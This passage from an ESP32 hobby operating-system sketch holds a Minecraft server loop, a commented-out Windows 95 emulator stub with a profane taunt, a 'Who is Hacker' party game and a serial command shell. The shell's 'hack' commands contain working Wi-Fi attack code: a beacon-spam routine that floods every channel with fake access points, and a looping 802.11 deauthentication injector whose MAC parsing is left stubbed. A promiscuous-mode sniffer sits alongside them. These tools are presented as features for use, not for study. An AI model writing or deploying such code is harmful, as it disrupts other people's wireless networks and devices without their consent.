          sendPacket(client, loginBuf, lp);


          delay(50);


          // ================================
          // Join Game
          // ================================

          sendJoinGame(client);

          delay(100);


          // ================================
          // 최초 청크 로드
          // ================================

          int startChunkX = (int)savedX >> 4;
          int startChunkZ = (int)savedZ >> 4;

          generateWorld(); 

          sendChunksAroundPlayer(client, startChunkX, startChunkZ);

          sendChunksAroundPlayer(client,
                                 startChunkX,
                                 startChunkZ);

          lastChunkX = startChunkX;
          lastChunkZ = startChunkZ;

          logToTFT("Chunks Sent", TFT_GREEN);


          delay(50);


          // ================================
          // 플레이어 위치 설정
          // ================================

          sendPosition(client,
                       savedX,
                       savedY,
                       savedZ);


          sendChatMessage(client,
                          "§aWelcome to ESP32-S3 Server");


          serverState = 3;

          lastKeepAlive = millis();

        }



        // ================================
        // PLAY STATE
        // ================================

        else if (serverState == 3) {

          // 위치 패킷 처리
          if (packetID == 0x04 || packetID == 0x06) {

            double playerX = savedX;
            double playerY = savedY;
            double playerZ = savedZ;


            int newChunkX =
              (int)playerX >> 4;

            int newChunkZ =
              (int)playerZ >> 4;


            // ================================
            // 청크 이동 감지
            // ================================

            if (newChunkX != lastChunkX || newChunkZ != lastChunkZ) {

              sendChunksAroundPlayer(client,
                                     newChunkX,
                                     newChunkZ);

              lastChunkX = newChunkX;
              lastChunkZ = newChunkZ;

              logToTFT("Chunk Update", TFT_ORANGE);
            }


            savePosition(playerX,
                         playerY,
                         playerZ);
          }


          // 나머지 데이터 버림
          int readBytes =
            getVarIntLen(packetID);

          while (readBytes < packetLen) {
            if (client.available()) {
              client.read();
              readBytes++;
            } else
              break;
          }
        }
      }


      // ================================
      // 연결 종료
      // ================================

      savePosition(savedX,
                   savedY,
                   savedZ);

      logToTFT("Client Disconnected",
               TFT_RED);

      client.stop();
    }
  }
}

//===Windows95===
/*

// 1. 더미 함수는 그대로 유지
void dummy_redraw(void* opaque, int x, int y, int w, int h) {}

extern "C" int IsKBHit() {
  return 0;
}

uint16_t vga_palette[256];

void init_palette() {
  for (int i = 0; i < 256; i++) {
    uint8_t r = (i & 0xE0);
    uint8_t g = (i & 0x1C) << 3;
    uint8_t b = (i & 0x03) << 6;

    vga_palette[i] =
      ((r & 0xF8) << 8) | ((g & 0xFC) << 3) | (b >> 3);
  }
}

void Windows95()
{
    static PCConfig conf;
    static bool initialized = false;
    static uint32_t last_render = 0;
    static uint32_t last_progress = 0;
    static int fake_percent = 0;

    if (!initialized)
    {
        tft.fillScreen(TFT_BLACK);
        tft.setTextColor(TFT_WHITE);
        tft.setCursor(0,0);
        tft.println("=== SYSTEM STATUS: DOMINATION ===");

        memset(&conf, 0, sizeof(conf));
        conf.cpu_gen = 3;
        conf.fpu = 1;
        conf.mem_size = 7 * 1024 * 1024; 
        conf.vga_mem_size = 512 * 1024;
        conf.width = 320;
        conf.height = 200;

        conf.bios = "/Ardudows/Assets/Other/bios.bin";
        conf.vga_bios = "/Ardudows/Assets/Other/VGABIOS-lgpl-latest.bin";
        conf.disks[0] = "/Ardudows/Assets/Other/win95.img";

        global_pc = pc_new(NULL, NULL, NULL, NULL, &conf);
        if(!global_pc) return;

        init_palette();
        initialized = true;
    }

    // 마이클에게 승리의 부스터 주입 (더 빠르게!)
    pc_run(800000); 

    uint8_t* phys_mem = (uint8_t*)global_pc->phys_mem;
    
    // --- [마지막 각인: 윌리엄의 완전한 패배] ---
    const char* win = "MICHAEL: THE WINNER";
    const char* lose = "WILLIAM: THE LOSER";
    const char* final_msg = "Fucking William afton! Your loser";
    
    // VRAM 텍스트 주소 (0xB8000)
    uint32_t base = 0xB8000;

    // 텍스트 주입 루틴
    auto inject = [&](int row, const char* s, uint8_t attr) {
        uint32_t addr = base + (80 * row * 2);
        for(int i = 0; s[i] != '\0'; i++) {
            phys_mem[addr + (i * 2)] = s[i];
            phys_mem[addr + (i * 2) + 1] = attr;
        }
    };

    inject(2, win, 0x1F);      // 파란 배경, 흰 글자 (승리)
    inject(10, lose, 0x4E);    // 빨간 배경, 노란 글자 (경고)
    inject(12, final_msg, 0x0C); // 그냥 빨간 글자 (독설)

    // --- 렌더링 엔진: 텍스트 디코더 모드 ---
    if(millis() - last_render > 150) // 텍스트는 갱신 주기를 조금 늦춰서 가독성 확보
    {
        uint8_t* vram = (uint8_t*)(phys_mem + 0xB8000);
        
        // 화면 중앙부만 갱신해서 깜빡임 최소화
        for(int row = 0; row < 20; row++) 
        {
            for(int col = 0; col < 40; col++) // 320폭에 맞게 40자만 출력
            {
                uint16_t offset = (row * 80 + col) * 2;
                uint8_t ascii = vram[offset];
                uint8_t attr = vram[offset + 1];

                // 속성 바이트에서 색상 추출
                uint16_t fg = ((attr & 0x0F) == 0x0E) ? TFT_YELLOW : 
                              ((attr & 0x0F) == 0x0F) ? TFT_WHITE : TFT_RED;
                uint16_t bg = ((attr & 0xF0) == 0x10) ? TFT_BLUE : 
                              ((attr & 0xF0) == 0x40) ? TFT_MAROON : TFT_BLACK;

                if (ascii >= 32 && ascii <= 126) {
                    tft.drawChar(col * 8, 40 + (row * 12), ascii, fg, bg, 1);
                }
            }
        }
        last_render = millis();
    }

    if (millis() - last_progress > 1000) {
        if (fake_percent < 100) fake_percent += 5;
        Serial.printf(">>> Winner Power: %d%% | Loser Ego: %d%% \n", fake_percent, 100-fake_percent);
        last_progress = millis();
    }
}

*/

//===ATK(Arudows Tiny Kernel)===
void ATK_Setup() {
  tft.fillScreen(TFT_BLACK);  // 🔥 추가
  tft.setCursor(0, 0);

  tft.println("Welcome to ATK for Arudows");
  //ATK_Installer();
  tft.println("Install complete!");

  Serial.println("ATK Ready.");
  Serial.print("ATK> ");
}

void ATK_Loop() {
  while (Serial.available()) {
    char c = Serial.read();

    if (c == '\n') {
      executeCommand(inputBuffer);
      inputBuffer = "";
      Serial.print("ATK> ");
    } else {
      inputBuffer += c;
    }
  }
}

// ===== Utility Functions =====
String getRoleName(GameRole role) {
  switch(role) {
    case ROLE_HACKER:       return "HACKER";
    case ROLE_USER:         return "USER";
    case ROLE_INTERNET_DEV: return "INTERNET_DEV (ADMIN)";
    case ROLE_FIREWALL_DEV: return "FIREWALL_DEV";
    case ROLE_DOCTOR:       return "DOCTOR";
    case ROLE_GUARD:        return "GUARD";
    case ROLE_INVESTIGATOR: return "INVESTIGATOR";
    case ROLE_CAMERAMAN:    return "CAMERAMAN";
    case ROLE_JOURNALIST:   return "JOURNALIST";
    case ROLE_COMMUNICATOR: return "COMMUNICATOR";
    case ROLE_IOT:          return "IOT_EXPLOITER";
    case ROLE_DISPLAY:      return "DISPLAY_INFO";
    case ROLE_COMPONENT:    return "COMPONENT_REPAIR";
    case ROLE_CORRUPTED:    return "CORRUPTED_NODE";
    default:                return "UNKNOWN_PROCESS";
  }
}

void gamePrint(String msg, uint16_t color = TFT_WHITE, int size = 2) {
  tft.setTextColor(color, TFT_BLACK);
  tft.setTextSize(size);
  tft.println(msg);
}

void gamePlayRickroll() {
  int melody[] = {494, 587, 659, 587, 740, 659};
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  gamePrint("\n[SYSTEM] AUDIO OVERRIDE\nNever gonna give you up...", TFT_MAGENTA, 2);
  for(int i=0; i<6; i++) {
    tone(GAME_BUZZER_PIN, melody[i], 200);
    delay(250);
  }
}

void gameShowAlertHell() {
  for(int i=0; i<4; i++) {
    tft.fillScreen(TFT_RED);
    tft.drawCentreString("CRITICAL SYSTEM ERROR", 160, 100, 4);
    tone(GAME_BUZZER_PIN, 440, 100);
    delay(250);
    tft.fillScreen(TFT_BLACK);
    delay(250);
  }
}

void gameAddLog(String msg) { 
  if (g_logCount < 40) g_nightLogs[g_logCount++] = msg; 
}

void gameSaveToSD() {
  File logFile = SD.open("/hacker_log.txt", FILE_APPEND);
  if (logFile) {
    logFile.println("=== SYSTEM LOG: LAST NIGHT ===");
    for(int i=0; i<g_logCount; i++) logFile.println(g_nightLogs[i]);
    logFile.println("------------------------------");
    logFile.close();
  } else {
    gamePrint("[SYS] SD Card Write Error. Ensure SD is mounted.", TFT_RED, 1);
  }
}

// ===== Game Engine (Night Logic) =====
void gameResolveNight() {
  g_logCount = 0;
  int hackerIdx = -1, devIdx = -1, guardIdx = -1, doctorIdx = -1, iotIdx = -1;
  int journalistIdx = -1, corruptedIdx = -1, compIdx = -1, camIdx = -1, invIdx = -1, dispIdx = -1;
  
  for(int i=0; i<g_totalPlayers; i++) {
    if(g_players[i].role == ROLE_HACKER) hackerIdx = i;
    if(g_players[i].role == ROLE_INTERNET_DEV) devIdx = i;
    if(g_players[i].role == ROLE_GUARD) guardIdx = i;
    if(g_players[i].role == ROLE_DOCTOR) doctorIdx = i;
    if(g_players[i].role == ROLE_IOT) iotIdx = i;
    if(g_players[i].role == ROLE_JOURNALIST) journalistIdx = i;
    if(g_players[i].role == ROLE_CORRUPTED) corruptedIdx = i;
    if(g_players[i].role == ROLE_COMPONENT) compIdx = i;
    if(g_players[i].role == ROLE_CAMERAMAN) camIdx = i;
    if(g_players[i].role == ROLE_INVESTIGATOR) invIdx = i;
    if(g_players[i].role == ROLE_DISPLAY) dispIdx = i;
  }

  // 1. Component
  if(compIdx != -1 && g_players[compIdx].alive && g_players[compIdx].target != -1) {
    g_firewallCount++;
    gameAddLog("[SYSTEM] Component repaired Firewall (+1).");
  }

  // 2. Guard & Doctor
  if(guardIdx != -1 && g_players[guardIdx].alive && g_players[guardIdx].target != -1) g_players[g_players[guardIdx].target].isProtected = true;
  if(doctorIdx != -1 && g_players[doctorIdx].alive && g_players[doctorIdx].target != -1) g_players[g_players[doctorIdx].target].isProtected = true; 

  // 3. IoT
  if(iotIdx != -1 && g_players[iotIdx].alive && g_players[iotIdx].target != -1) g_players[g_players[iotIdx].target].delayMultiplier = 2; 

  // 4. Admin (Internet Developer)
  if(devIdx != -1 && g_players[devIdx].alive && g_players[devIdx].target != -1) {
    int devTarget = g_players[devIdx].target;
    if(devTarget == devIdx) {
      g_players[devIdx].alive = false;
      gameAddLog("[FATAL] Admin executed recursive loop. Self-Destructed.");
    } else {
      gameAddLog("[NETWORK] Packet routing manipulated by Admin. (Toss Activated)");
      if(hackerIdx != -1) g_players[hackerIdx].target = devTarget; 
      g_players[devTarget].isAlertHell = true; 
    }
  }

  // 5. Hacker & Corrupted
  if(hackerIdx != -1 && g_players[hackerIdx].alive && g_players[hackerIdx].target != -1) {
    GamePlayer &target = g_players[g_players[hackerIdx].target];
    String attackerStr = "Hacker";
    
    if(corruptedIdx != -1 && g_players[corruptedIdx].alive && g_players[corruptedIdx].target != -1) {
      attackerStr = g_players[g_players[corruptedIdx].target].name;
    }

    if(target.role == ROLE_INTERNET_DEV) {
      gameAddLog("[SECURITY] " + attackerStr + " attack denied: Target has 'Admin Privilege'.");
    } else if(target.isProtected || g_firewallCount > 0) {
      gameAddLog("[DEFENSE] " + attackerStr + " attack neutralized by security protocols.");
      if(!target.isProtected && g_firewallCount > 0) g_firewallCount--;
    } else {
      target.alive = false;
      gameAddLog("[DELETED] " + target.name + " was removed by " + attackerStr + ".");
    }
  }

  // 6. Investigator, Cameraman, Display
  if(camIdx != -1 && g_players[camIdx].alive && g_players[camIdx].target != -1) {
     int cTarget = g_players[camIdx].target;
     gameAddLog("[CCTV] " + g_players[cTarget].name + " visited Node " + String(g_players[cTarget].target));
  }
  if(dispIdx != -1 && g_players[dispIdx].alive && g_players[dispIdx].target != -1) {
     int dTarget = g_players[dispIdx].target;
     if(!g_players[dTarget].alive) gameAddLog("[DISPLAY] Deceased Node " + g_players[dTarget].name + " was Role ID " + getRoleName(g_players[dTarget].role)); // 텍스트 이름 적용
  }

  // 7. Journalist
  if(journalistIdx != -1 && g_players[journalistIdx].alive && g_players[journalistIdx].stringInput != "") {
    gameAddLog("[NEWS] " + g_players[journalistIdx].stringInput);
  }

  // ===== Dynamic Anomalies =====
  if(random(100) < 3) { 
    gameAddLog("[ANOMALY] Packet from Server 221 (2026-02-21). Data Restored.");
    for(int i=0; i<g_totalPlayers; i++) {
      if(!g_players[i].alive) { g_players[i].alive = true; break; }
    }
  }

  if(random(100) < 5 && g_logCount > 0) { 
    gameAddLog("[ERROR] Sector 0xAF corrupted. Log expunged.");
    g_logCount--; 
  }

  gameSaveToSD();
}

// ===== Screen Drawing Helpers =====
void drawPassScreen() {
  while(g_currentPlayerIdx < g_totalPlayers && !g_players[g_currentPlayerIdx].alive) {
    g_currentPlayerIdx++; // 죽은 사람은 자동 패스
  }
  
  if(g_currentPlayerIdx >= g_totalPlayers) {
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 0);
    gamePrint("Processing Night Protocols...", TFT_CYAN, 2);
    gameResolveNight();
    g_appStage = APP_STAGE_RESULT;
    
    // Result Screen Draw
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 0);
    gamePrint("=== END OF LINE ===", TFT_CYAN, 2);
    for(int i=0; i<g_logCount; i++) gamePrint(g_nightLogs[i], TFT_WHITE, 1);
    
    bool hackerAlive = false, userAlive = false, devAlive = false;
    for(int i=0; i<g_totalPlayers; i++) {
      if(g_players[i].alive && g_players[i].role == ROLE_HACKER) hackerAlive = true;
      if(g_players[i].alive && g_players[i].role == ROLE_USER) userAlive = true;
      if(g_players[i].alive && g_players[i].role == ROLE_INTERNET_DEV) devAlive = true;
    }

    if(!userAlive) {
      gamePrint("\n[ SYSTEM OVERRIDE: HACKER WIN ]", TFT_RED, 2);
      g_isHackerRunning = false;
    }
    else if(!hackerAlive) {
      gamePrint("\n[ THREAT NEUTRALIZED: USER WIN ]", TFT_GREEN, 2);
      g_isHackerRunning = false;
    }
    if(devAlive) gamePrint("\n[ Admin Maintains 100% Win Rate ]", TFT_MAGENTA, 2);
    
    if(g_isHackerRunning) {
      gamePrint("\n[ Type ENTER for Next Night ]", TFT_DARKGREY, 1);
      tft.print("> ");
    } else {
      gamePrint("\n[ GAME OVER. Type EXIT or ENTER to return to Ardudows ]", TFT_DARKGREY, 1);
      tft.print("> ");
    }
    return;
  }

  GamePlayer &p = g_players[g_currentPlayerIdx];
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  gamePrint(">>> WAITING FOR NEXT NODE <<<", TFT_CYAN, 2);
  gamePrint("\nNODE NAME: " + p.name, TFT_WHITE, 3);
  gamePrint("\n[ Press ENTER to Auth ]", TFT_DARKGREY, 1);
  tft.print("> ");
}

void drawAuthScreen() {
  GamePlayer &p = g_players[g_currentPlayerIdx];
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  
  if(p.isAlertHell) {
    gameShowAlertHell();
    gamePlayRickroll();
    p.isAlertHell = false;
  }
  if(p.delayMultiplier > 1) {
    gamePrint("[WARNING] Network throttled by IoT.", TFT_YELLOW, 2);
    delay(2000); // 연출용 딜레이는 유지
    p.delayMultiplier = 1;
  }
  
  gamePrint("ACCESS GRANTED.", TFT_GREEN, 2);
  gamePrint("ROLE NAME: " + getRoleName(p.role), TFT_WHITE, 2); // 1이 아닌 이름으로 출력
  gamePrint("\nEnter Target Node ID (0-" + String(g_totalPlayers-1) + "): ", TFT_YELLOW, 2);
  tft.print("> ");
}

// ===== OS Interface: 게임 실행 함수 =====
void Start_Who_is_Hacker() {
  g_isHackerRunning = true;
  g_appStage = APP_INIT_NODES;
  
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  gamePrint("--- OS APP: WHO IS HACKER ---", TFT_CYAN, 2);
  gamePrint("\nEnter Total Nodes (3-14): ", TFT_WHITE, 1);
  tft.print("> ");
}

// ===== OS Interface: 입력 처리 함수 (ATK 메인 루프에서 호출) =====
void Process_Who_is_Hacker(String inputStr) {
  inputStr.trim();
  
  switch(g_appStage) {
    case APP_INIT_NODES:
      g_totalPlayers = inputStr.toInt();
      if(g_totalPlayers < 3) g_totalPlayers = 3;
      if(g_totalPlayers > GAME_MAX_PLAYERS) g_totalPlayers = GAME_MAX_PLAYERS;
      
      // 롤 배정
      if(g_totalPlayers == 3) {
        rolePool[0] = ROLE_HACKER; rolePool[1] = ROLE_USER; rolePool[2] = ROLE_INTERNET_DEV;
      } else {
        for(int i=0; i<g_totalPlayers; i++) rolePool[i] = (GameRole)i;
        for(int i = g_totalPlayers - 1; i > 0; i--) {
          int j = random(i + 1);
          GameRole temp = rolePool[i]; rolePool[i] = rolePool[j]; rolePool[j] = temp;
        }
      }
      
      g_setupNameIdx = 0;
      g_appStage = APP_INIT_NAMES;
      gamePrint("\nName for Node 0: ", TFT_WHITE, 1);
      tft.print("> ");
      break;

    case APP_INIT_NAMES:
      g_players[g_setupNameIdx].name = inputStr;
      g_players[g_setupNameIdx].role = rolePool[g_setupNameIdx];
      g_players[g_setupNameIdx].alive = true;
      gamePrint(">> [" + g_players[g_setupNameIdx].name + "] Registered.", TFT_YELLOW, 1);
      
      g_setupNameIdx++;
      if(g_setupNameIdx < g_totalPlayers) {
        gamePrint("\nName for Node " + String(g_setupNameIdx) + ": ", TFT_WHITE, 1);
        tft.print("> ");
      } else {
        g_currentPlayerIdx = 0;
        g_appStage = APP_STAGE_PASS;
        drawPassScreen();
      }
      break;

    case APP_STAGE_PASS:
      g_appStage = APP_STAGE_AUTH_TARGET;
      drawAuthScreen();
      break;

    case APP_STAGE_AUTH_TARGET:
      g_players[g_currentPlayerIdx].target = inputStr.toInt();
      
      if(g_players[g_currentPlayerIdx].role == ROLE_JOURNALIST) {
        gamePrint("\nEnter Fake Log String: ", TFT_YELLOW, 2);
        tft.print("> ");
        g_appStage = APP_STAGE_AUTH_LOG;
      } else {
        gamePrint("\nCommand Executed.", TFT_GREEN, 2);
        delay(1000); 
        g_currentPlayerIdx++;
        g_appStage = APP_STAGE_PASS;
        drawPassScreen();
      }
      break;
      
    case APP_STAGE_AUTH_LOG:
      g_players[g_currentPlayerIdx].stringInput = inputStr;
      gamePrint("\nCommand Executed.", TFT_GREEN, 2);
      delay(1000);
      g_currentPlayerIdx++;
      g_appStage = APP_STAGE_PASS;
      drawPassScreen();
      break;

    case APP_STAGE_RESULT:
      if (!g_isHackerRunning) {
        // 게임이 종료된 상태에서 엔터를 치면 Ardudows 메인 화면으로 복귀하도록 플래그 해제 완료됨
        tft.fillScreen(TFT_BLACK);
        tft.setCursor(0, 0);
        gamePrint("Returning to Ardudows OS...", TFT_CYAN, 2);
        delay(1000);
        // 여기서 ATK 쉘 프롬프트 다시 그려주는 함수가 있다면 호출하면 좋습니다.
        return;
      }
      g_currentPlayerIdx = 0;
      for(int i=0; i<g_totalPlayers; i++) g_players[i].isProtected = false;
      g_appStage = APP_STAGE_PASS;
      drawPassScreen();
      break;
  }
}

//===명령어===

/*
   ATK Mini OS - All In One
   ESP32 + TFT + SD + WiFi + BLE
*/

// ================== PATH ==================

String normalizePath(String path) {
  path.trim();

  if (path == "" || path == ".")
    return currentPath;

  if (path == "..") {
    int last = currentPath.lastIndexOf('/');
    if (last <= 0) return "/";
    return currentPath.substring(0, last);
  }

  if (path.startsWith("/"))
    return path;

  if (currentPath.endsWith("/"))
    return currentPath + path;

  return currentPath + "/" + path;
}

// ================== HELP ==================

void cmd_help() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextSize(1);
  tft.setTextColor(TFT_CYAN);
  tft.println(F("==== [ ARDUDOWS ATK COMMANDS ] ===="));
  
  // 1. SYSTEM & HW (Yellow)
  tft.setTextColor(TFT_YELLOW);
  tft.println(F("[ SYS ] ver, cls, info, uptime, temp"));
  tft.println(F("[ HW  ] hw, mac, flash, sketch, psram"));
  tft.println(F("[ IO  ] gpio check, i2c scan, sleep [s]"));

  // 2. FILE SYSTEM (White)
  tft.setTextColor(TFT_WHITE);
  tft.println(F("[ FS  ] ls, cd, pwd, touch, cat, rm"));
  tft.print(F("        echo \"text\">file"));
  tft.println();

  // 3. NETWORK (Green)
  tft.setTextColor(TFT_GREEN);
  tft.println(F("[ NET ] wifi scan, wifi connect [s][p]"));
  tft.println(F("        ping, nslookup, curl, router"));

  // 4. BLUETOOTH (Blue)
  tft.setTextColor(TFT_BLUE);
  tft.println(F("[ BLE ] ble init, scan, connect [id]"));

  // 5. HACK & GUERILLA (Red) - 가장 중요한 부분!
  tft.setTextColor(TFT_RED);
  tft.println(F("[HACK ] list, lock [id], rick, lag"));
  tft.println(F("        safe [id], stealth, finish"));

  // 6. ENGINES (Magenta)
  tft.setTextColor(TFT_MAGENTA);
  tft.println(F("[ APP ] mc start, win95, wh"));

  tft.setTextColor(TFT_CYAN);
  tft.println(F("===================================="));
  
  // 하단에 팁 하나 추가
  tft.setTextColor(TFT_GREEN);
  tft.setTextSize(2);
}

String generateRandomSSID32() {
  const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+-=[]{}|;:,.<>?";
  String res = "";
  for (int i = 0; i < 32; i++) {
    res += charset[esp_random() % (sizeof(charset) - 1)];
  }
  return res;
}

uint8_t beacon_packet[128] = {
  0x80, 0x00,                         // Frame Control (Beacon)
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC (가짜로 생성 예정)
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID
  0x00, 0x00,                         // Sequence Control
  // --- Fixed Parameters ---
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
  0x64, 0x00,                         // Beacon Interval
  0x31, 0x04,                         // Capability Info
  // --- Tagged Parameters ---
  0x00, 0x20                          // Tag: SSID, Length: 32(0x20)
  // 여기에 32자 SSID가 들어감 (index 38부터)
};

void cmd_hack_spam() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(TFT_RED);
  tft.println(">> SSID SPAM: CARPET BOMBING");
  tft.println(">> [PRESS ANY KEY TO STOP]");
  tft.println("----------------------------");

  esp_wifi_set_mode(WIFI_MODE_AP);
  
  while (!Serial.available()) {
    for (int ch = 1; ch <= 13; ch++) {
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      
      for (int burst = 0; burst < 3; burst++) {
        String ssid = generateRandomSSID32();
        
        // 1. SSID 복사
        for (int i = 0; i < 32; i++) {
          beacon_packet[38 + i] = ssid[i];
        }

        // 2. MAC 주소 랜덤화 (에러 해결 지점!)
        //beacon_packet[i] = 0x00; 
        for (int i = 11; i < 16; i++) {
          uint8_t r = (uint8_t)(esp_random() % 256);
          beacon_packet[i] = r;      // 인덱스 i를 반드시 써줘야 함
          beacon_packet[i + 6] = r;  // BSSID 부분에도 인덱스 i+6 사용
        }

        // 3. 전송
        esp_wifi_80211_tx(WIFI_IF_AP, beacon_packet, 38 + 32, true);
        
        if (burst == 0) {
          tft.setTextColor(TFT_WHITE, TFT_BLACK);
          tft.printf("[CH:%02d] TX: %s\n", ch, ssid.substring(0, 10).c_str());
        }
      }
      
      if (tft.getCursorY() > 230) {
        tft.fillRect(0, 60, 320, 180, TFT_BLACK);
        tft.setCursor(0, 60);
      }
      delay(1); 
      if (Serial.available()) break;
    }
    yield();
  }
  tft.setTextColor(TFT_GREEN);
  tft.println(">> ATTACK TERMINATED.");
}

void cmd_hack_detector() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_YELLOW);
  tft.println(">> RF WAVE DETECTOR ACTIVE");
  tft.println(">> SCANNING 2.4GHz SPECTRUM...");
  
  while(!Serial.available()) {
    // 주변 AP 개수 스캔
    int n = WiFi.scanNetworks(true, true); // 비동기 스캔
    
    for (int i = 0; i < n; i++) {
      int rssi = WiFi.RSSI(i);
      String ssid = WiFi.SSID(i);
      
      // RSSI 수치에 따라 색상 변경 (강할수록 붉은색)
      uint16_t color = TFT_GREEN;
      if (rssi > -50) color = TFT_RED;
      else if (rssi > -70) color = TFT_YELLOW;

      // 시각적 막대 그래프 출력
      int barWidth = map(rssi, -100, -30, 0, 200);
      tft.fillRect(100, 30 + (i*15), 200, 10, TFT_BLACK); // 잔상 제거
      tft.fillRect(100, 30 + (i*15), barWidth, 10, color);
      
      tft.setCursor(0, 30 + (i*15));
      tft.setTextColor(TFT_WHITE);
      tft.printf("%-10s", ssid.substring(0, 8).c_str());
    }
    delay(500);
    if(n > 15) tft.fillScreen(TFT_BLACK); // 화면 꽉 차면 갱신
  }
}

// Deauth 프레임 구조 (802.11 표준)
uint8_t deauth_template[] = {
  0xc0, 0x00,                         // Type: Management Frame (Deauthentication)
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (타겟)
  0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, // Source (공유기)
  0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, // BSSID (공유기)
  0x00, 0x00,                         // Sequence number
  0x07, 0x00                          // Reason code: Class 3 frame received from nonassociated STA
};

void cmd_hack_deauth(String targetMAC, String apMAC) {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_RED);
  tft.println(">> ARDUDOWS DEAUTH STRIKER");
  tft.printf(">> TARGET: %s\n", targetMAC.c_str());
  tft.printf(">> SOURCE: %s\n", apMAC.c_str());
  tft.println(">> STATUS: INJECTING...");

  uint8_t packet[26];
  memcpy(packet, deauth_template, 26);

  // MAC 주소 문자열을 바이트 배열로 변환하는 함수 필요 (생략)
  // parse_mac(targetMAC, &packet[4]); // Destination
  // parse_mac(apMAC, &packet[10]);     // Source
  // parse_mac(apMAC, &packet[16]);     // BSSID

  esp_wifi_set_mode(WIFI_MODE_AP); // Raw 전송을 위해 AP 모드 활성화

  while (!Serial.available()) {
    // 1. 기기에게 보냄 (공유기인 척)
    esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, true);
    
    // 2. 방향을 바꿔서 공유기에게도 보냄 (기기인 척)
    // memcpy(&packet[4], apMAC_bytes, 6);
    // memcpy(&packet[10], targetMAC_bytes, 6);
    // esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, true);

    tft.setCursor(0, 80);
    tft.printf("[TX] DEAUTH PACKET SENT... %lu\n", millis());
    delay(10); // 공격 속도 조절 (너무 빠르면 버퍼 오버플로우)
  }
  
  tft.setTextColor(TFT_GREEN);
  tft.println(">> ATTACK HALTED.");
}

void cmd_hack_list() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_CYAN);
  tft.println(">> SCANNING FOR VULNERABLE TARGETS...");

  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; i++) {
    tft.printf("[%d] %s (%ddBm) CH:%d\n", i, WiFi.SSID(i).c_str(), WiFi.RSSI(i), WiFi.channel(i));
    // 여기서 타겟의 BSSID(MAC)를 수집해야 함
  }
}

// [전역 변수] 실시간 전파 강도 저장소
int live_rssi = -100;

// [스니퍼 콜백] 공중에서 패킷을 낚아챌 때마다 실행
void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  // 패킷의 헤더에서 RSSI(신호 세기)만 쏙 빼옵니다.
  live_rssi = pkt->rx_ctrl.rssi;
}

void cmd_hack_wave() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_GREEN);
  tft.println(">> RF SNIFFER MODE: ON");
  tft.println(">> ABSORBING AMBIENT WAVES...");

  // 1. 와이파이 스택 초기화 및 난잡 모드 활성화
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);

  int x = 0;
  int prev_y = 120;
  uint8_t current_ch = 1;

  while(!Serial.available()) {
    // 2. 현재 낚아챈 따끈따끈한 RSSI 값 사용
    int rssi = live_rssi;

    // 3. 그래프 좌표 변환 (보통 -95에서 -20 사이에서 움직임)
    int y = map(rssi, -100, -20, 230, 30);
    
    // 4. 드로잉 (전파의 요동을 시각화)
    tft.drawLine(x, prev_y, x + 2, y, TFT_GREEN);
    
    // 상단에 현재 수치 및 채널 표시 (디지털 감성)
    tft.fillRect(0, 0, 150, 25, TFT_BLACK);
    tft.setCursor(5, 5);
    tft.printf("CH:%02d | %d dBm", current_ch, rssi);

    prev_y = y;
    x += 2;

    // 화면 끝에 도달하면 채널을 바꾸고 화면 초기화
    if (x > 318) {
      x = 0;
      tft.fillRect(0, 30, 320, 210, TFT_BLACK);
      
      // 채널 호핑: 1~13채널을 순회하며 모든 전파를 먹음
      current_ch++;
      if (current_ch > 13) current_ch = 1;
      esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
    }
    
    delay(15); // 반응 속도 최적화
    yield();   // 시스템 안정성 확보
  }

  // 종료 시 난잡 모드 해제 (매너)
  esp_wifi_set_promiscuous(false);
  tft.setTextColor(TFT_YELLOW);
  tft.println("\n>> SNIFFER DISENGAGED.");
}

// ================== FILE SYSTEM ==================

void cmd_ls() {
  File dir = SD.open(currentPath);

  if (!dir || !dir.isDirectory()) {
    tft.println("No directory");
    return;
  }

  File file = dir.openNextFile();

  if (!file) {
    tft.println("(empty)");
    return;
  }

  while (file) {
    if (file.isDirectory())
      tft.println(String("[DIR] ") + file.name());
    else
      tft.println(file.name());

    file = dir.openNextFile();
  }
}

void cmd_cd(String path) {
  String newPath = normalizePath(path);

  File dir = SD.open(newPath);

  if (dir && dir.isDirectory()) {
    currentPath = newPath;
    tft.println(currentPath);
  } else
    tft.println("Not found");

  dir.close();
}

void cmd_touch(String name) {
  File f = SD.open(normalizePath(name), FILE_WRITE);

  if (f) {
    f.close();
    tft.println("Created");
  } else
    tft.println("Failed");
}

void cmd_cat(String name) {
  File f = SD.open(normalizePath(name));

  if (!f) {
    tft.println("Not found");
    return;
  }

  while (f.available())
